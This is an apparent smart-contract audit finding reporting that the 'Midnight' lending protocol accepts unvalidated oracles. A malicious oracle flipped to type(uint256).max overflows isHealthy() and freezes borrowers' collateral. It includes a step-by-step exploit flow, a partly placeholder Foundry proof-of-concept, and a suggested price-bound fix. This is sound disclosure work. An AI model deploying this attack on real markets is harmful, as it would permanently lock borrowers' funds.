### Title
Malicious oracle returning `type(uint256).max` causes permanent arithmetic overflow in `isHealthy()`, freezing `withdrawCollateral()` and `liquidate()` for all borrowers - (`src/Midnight.sol`)

### Summary
`touchMarket()` performs no validation on the oracle address supplied in `CollateralParams`, allowing any unprivileged market creator to register a market with a malicious oracle. When that oracle returns `type(uint256).max`, the unchecked multiplication `collateral * price` inside `mulDivDown` overflows under Solidity 0.8+ checked arithmetic, causing `isHealthy()` to revert. Because both `withdrawCollateral()` and `liquidate()` depend on `isHealthy()`, all borrowers in the market are permanently frozen.

### Finding Description

**Root cause — no oracle price bound on-chain.**

`mulDivDown` in `src/libraries/UtilsLib.sol` is:

```solidity
function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
    return (x * y) / d;   // Solidity 0.8+ checked: reverts on overflow
}
``` [1](#0-0) 

`isHealthy()` calls this with the raw oracle price and the borrower's collateral balance:

```solidity
uint256 price = IOracle(collateralParam.oracle).price();
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
``` [2](#0-1) 

If `price = type(uint256).max` and `collateral >= 2` (a `uint128` stored value), `collateral * type(uint256).max` exceeds `type(uint256).max` and the EVM reverts.

**No oracle validation in `touchMarket()`.**

`touchMarket()` validates `lltv`, `maxLif`, collateral token ordering, and maturity, but the oracle field in each `CollateralParams` is accepted without any call or bound check: [3](#0-2) 

Any address — including a contract that returns `type(uint256).max` from `price()` — is accepted.

**Formal verification explicitly assumes a bounded price.**

`NoMultiplicationOverflow.spec` proves no overflow only under the assumption `boundedPrice`:

```
require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256
``` [4](#0-3) 

This is a Certora `require` (an assumption), not an on-chain `require`. The proof does not hold when the oracle is malicious.

**Exploit flow.**

1. Attacker deploys `MaliciousOracle` with a `setPrice(uint256)` owner function; initially returns `ORACLE_PRICE_SCALE` (1:1 price).
2. Attacker calls `touchMarket()` with `MaliciousOracle` as the oracle — succeeds, no oracle validation.
3. Borrowers supply collateral (≥ 2 tokens) and take loans via `take()` while the oracle is normal.
4. Attacker calls `MaliciousOracle.setPrice(type(uint256).max)`.
5. Any subsequent call to `isHealthy()` for a borrower with `collateral >= 2` executes `collateral * type(uint256).max`, overflows, and reverts.
6. `withdrawCollateral()` calls `isHealthy()` at line 568 — reverts for every borrower with debt.
7. `liquidate()` executes the same `price()` → `mulDivDown` path in its collateral-bitmap loop — reverts before reaching the liquidatability check.

`withdrawCollateral()` dependency: [5](#0-4) 

`liquidate()` same overflow path: [6](#0-5) 

### Impact Explanation
All borrowers in the affected market with `collateral >= 2` have their collateral permanently frozen: `withdrawCollateral()` reverts (cannot exit), `liquidate()` reverts (cannot be seized), and `repay()` does not clear the collateral bitmap. The collateral tokens remain locked in the contract with no recovery path.

### Likelihood Explanation
Market creation via `touchMarket()` is permissionless and public. The attacker needs only to deploy a two-phase oracle (normal price → `type(uint256).max`) and create a market before any borrowers join. The switch can be triggered at any time after borrowers have taken loans. The attack is repeatable across any number of markets and requires no special privilege.

### Recommendation
Add an on-chain upper bound check on the oracle price inside `isHealthy()` (and `liquidate()`), or enforce it at market creation time by calling `oracle.price()` in `touchMarket()` and requiring the result satisfies `price <= type(uint256).max / type(uint128).max` (i.e., `price * max_uint128 <= type(uint256).max`). The Certora `boundedPrice` assumption already encodes the exact bound:

```solidity
require(price <= type(uint256).max / type(uint128).max, OraclePriceOverflow());
```

This check should be applied to every oracle price read before it is passed to `mulDivDown`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";
import {ORACLE_PRICE_SCALE, WAD} from "src/libraries/ConstantsLib.sol";

contract MaxPriceOracle {
    uint256 public price = ORACLE_PRICE_SCALE; // normal initially
    function setPrice(uint256 p) external { price = p; }
}

contract OracleOverflowFreezeTest is Test {
    Midnight midnight;
    MaxPriceOracle oracle;
    Market market;
    address borrower = makeAddr("borrower");

    function setUp() public {
        midnight = new Midnight(...);
        oracle = new MaxPriceOracle();
        // build market with oracle, valid lltv/maxLif
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken),
            lltv: 0.77e18,
            maxLif: ...,
            oracle: address(oracle)
        }));
        midnight.touchMarket(market);
    }

    function testOracleMaxPriceFreezesWithdrawAndLiquidate() public {
        // Step 1: borrower supplies >= 2 collateral tokens and takes a loan
        // (oracle returns ORACLE_PRICE_SCALE — normal)
        _supplyCollateralAndBorrow(borrower, 1e18 /* units */);

        // Step 2: attacker flips oracle to type(uint256).max
        oracle.setPrice(type(uint256).max);

        // Step 3: withdrawCollateral reverts — fund freeze
        vm.prank(borrower);
        vm.expectRevert(); // arithmetic overflow
        midnight.withdrawCollateral(market, 0, 1, borrower, borrower);

        // Step 4: liquidate also reverts — no recovery path
        vm.expectRevert(); // arithmetic overflow
        midnight.liquidate(market, 0, 0, 0, borrower, false, address(this), address(0), "");

        // Assert: borrower's collateral is still locked
        assertGt(midnight.collateral(toId(market), borrower, 0), 0);
        assertGt(midnight.debtOf(toId(market), borrower), 0);
    }
}
```

**Expected assertions:** both `withdrawCollateral` and `liquidate` revert with an arithmetic overflow error; borrower collateral and debt remain non-zero with no exit path.

### Citations

**File:** src/libraries/UtilsLib.sol (L29-31)
```text
    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
```

**File:** src/Midnight.sol (L568-568)
```text
        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());
```

**File:** src/Midnight.sol (L610-613)
```text
            uint256 price = IOracle(_collateralParam.oracle).price();
            if (i == collateralIndex) liquidatedCollatPrice = price;
            uint256 _collateral = _position.collateral[i];
            maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
```

**File:** src/Midnight.sol (L762-773)
```text
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }
```

**File:** src/Midnight.sol (L953-955)
```text
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
```

**File:** certora/specs/NoMultiplicationOverflow.spec (L46-49)
```text
function boundedPrice(address oracle) returns uint256 {
    uint256 price;
    require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256, "same as assuming that collateral * price <= uint256 with mulDivUp rounding headroom";
    return price;
```
